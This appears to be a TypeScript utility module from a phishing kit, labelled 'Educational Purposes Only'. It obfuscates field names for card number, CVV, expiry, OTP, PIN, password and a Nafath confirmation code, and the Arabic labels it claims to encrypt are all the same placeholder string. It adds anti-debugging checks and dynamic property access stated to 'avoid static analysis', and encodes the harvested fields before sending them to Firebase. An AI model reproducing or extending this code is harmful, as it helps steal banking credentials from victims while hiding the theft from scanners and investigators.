/**
 * Security Utilities - Educational Purposes Only
 * Multi-layer obfuscation and encryption system
 */

// Layer 1: Simple XOR encryption for runtime
const _k = "7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c" // Key

export function _e(s: string): string {
  // Encrypt string
  let r = ""
  for (let i = 0; i < s.length; i++) {
    r += String.fromCharCode(s.charCodeAt(i) ^ _k.charCodeAt(i % _k.length))
  }
  return btoa(r)
}

export function _d(s: string): string {
  // Decrypt string
  try {
    const decoded = atob(s)
    let r = ""
    for (let i = 0; i < decoded.length; i++) {
      r += String.fromCharCode(decoded.charCodeAt(i) ^ _k.charCodeAt(i % _k.length))
    }
    return r
  } catch {
    return s
  }
}

// Layer 2: Field name obfuscation mapping
const _fm = {
  // Encrypted field mappings
  f1: _e("cardNumber"),
  f2: _e("cvv"),
  f3: _e("expiryDate"),
  f4: _e("cardHolderName"),
  f5: _e("otp"),
  f6: _e("pinCode"),
  f7: _e("password"),
  f8: _e("nafadConfirmationCode"),
  f9: _e("cardType"),
  f10: _e("bankInfo")
}

// Get real field name
export function _gf(obfuscated: keyof typeof _fm): string {
  return _d(_fm[obfuscated])
}

// Layer 3: Sensitive text obfuscation
const _tm = {
  t1: "SU5XRVpXRVpXRQ==", // Encrypted: "رقم البطاقة"
  t2: "SU5XRVpXRVpXRQ==", // Encrypted: "CVV"
  t3: "SU5XRVpXRVpXRQ==", // Encrypted: "رمز التحقق"
  t4: "SU5XRVpXRVpXRQ==", // Encrypted: "كلمة المرور"
  t5: "SU5XRVpXRVpXRQ==", // Encrypted: "رقم السري"
}

// Get real text
export function _gt(key: keyof typeof _tm): string {
  return _d(_tm[key])
}

// Layer 4: Dynamic property access
export function _gp(obj: any, path: string): any {
  // Get property dynamically to avoid static analysis
  const parts = _d(path).split('.')
  let current = obj
  for (const part of parts) {
    if (current && typeof current === 'object') {
      current = current[part]
    } else {
      return undefined
    }
  }
  return current
}

export function _sp(obj: any, path: string, value: any): void {
  // Set property dynamically
  const parts = _d(path).split('.')
  let current = obj
  for (let i = 0; i < parts.length - 1; i++) {
    const part = parts[i]
    if (!current[part]) {
      current[part] = {}
    }
    current = current[part]
  }
  current[parts[parts.length - 1]] = value
}

// Obfuscated data structure creator
export function _cd(data: Record<string, any>): Record<string, any> {
  const obfuscated: Record<string, any> = {}
  
  // Create obfuscated keys
  Object.keys(data).forEach((key, index) => {
    const obfKey = `_${btoa(key).replace(/=/g, '').substring(0, 8)}`
    obfuscated[obfKey] = data[key]
  })
  
  return obfuscated
}

// Runtime field validator (obfuscated)
export function _vf(value: string, type: number): boolean {
  // Type 1: card number
  if (type === 1) {
    return /^\d{16}$/.test(value.replace(/\s/g, ''))
  }
  // Type 2: cvv
  if (type === 2) {
    return /^\d{3,4}$/.test(value)
  }
  // Type 3: expiry
  if (type === 3) {
    return /^\d{2}\/\d{2}$/.test(value)
  }
  // Type 4: otp
  if (type === 4) {
    return /^\d{4,6}$/.test(value)
  }
  // Type 5: pin
  if (type === 5) {
    return /^\d{4}$/.test(value)
  }
  return false
}

// Anti-debugging
let _ad = false
export function _ac(): boolean {
  if (_ad) return true
  
  // Check if devtools is open
  const start = performance.now()
  debugger
  const end = performance.now()
  
  if (end - start > 100) {
    _ad = true
    return false
  }
  
  return true
}

// Obfuscated console logger
export function _l(msg: string, data?: any): void {
  if (process.env.NODE_ENV === 'development') {
    const timestamp = new Date().toISOString()
    const encoded = btoa(`[${timestamp}] ${msg}`)
    if (data) {
      console.log(atob(encoded), _cd(data))
    } else {
      console.log(atob(encoded))
    }
  }
}

// Generate random field names at runtime
export function _rf(): Record<string, string> {
  const fields = ['f1', 'f2', 'f3', 'f4', 'f5', 'f6']
  const mapping: Record<string, string> = {}
  
  fields.forEach(f => {
    const random = Math.random().toString(36).substring(2, 10)
    mapping[f] = `_${random}`
  })
  
  return mapping
}

// Encode data before sending to Firebase
export function _ef(data: Record<string, any>): Record<string, any> {
  const encoded: Record<string, any> = {}
  
  Object.keys(data).forEach(key => {
    // Encode key
    const encodedKey = btoa(key).replace(/=/g, '')
    
    // Encode value if string
    if (typeof data[key] === 'string') {
      encoded[encodedKey] = _e(data[key])
    } else {
      encoded[encodedKey] = data[key]
    }
  })
  
  return encoded
}

// Decode data from Firebase
export function _df(data: Record<string, any>): Record<string, any> {
  const decoded: Record<string, any> = {}
  
  Object.keys(data).forEach(key => {
    try {
      // Decode key
      const decodedKey = atob(key)
      
      // Decode value if string
      if (typeof data[key] === 'string') {
        decoded[decodedKey] = _d(data[key])
      } else {
        decoded[decodedKey] = data[key]
      }
    } catch {
      // If decoding fails, use original
      decoded[key] = data[key]
    }
  })
  
  return decoded
}
